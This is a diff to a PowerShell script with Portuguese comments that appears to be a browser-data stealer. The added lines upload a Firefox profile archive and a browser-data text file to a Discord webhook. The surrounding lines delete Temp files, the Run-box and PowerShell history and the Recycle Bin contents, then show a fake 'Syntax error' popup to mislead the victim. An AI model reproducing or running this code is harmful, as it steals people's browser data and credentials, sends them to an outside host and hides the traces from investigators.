@@ -607,6 +607,12 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
  
 
+# Upload dos arquivos para o Discord
+if (-not ([string]::IsNullOrEmpty($dc))){
+    Upload-Discord -file "$env:temp\Perfil_Firefox.rar"
+    Upload-Discord -file "$env:temp\BrowserData.txt"
+}
+
 ############################################################################################################################################################
 
 <#
@@ -615,24 +621,16 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 #>
 
 # Delete nos ficheiros da pasta Temp
-
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete no histórico do run box 
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete no histórico da powershell
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Esvazia a Reciclagem
-
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
-		
-############################################################################################################################################################
-
 # sinal que acabou um Pop-up
-
 $done = New-Object -ComObject Wscript.Shell;$done.Popup("Syntax error",1)
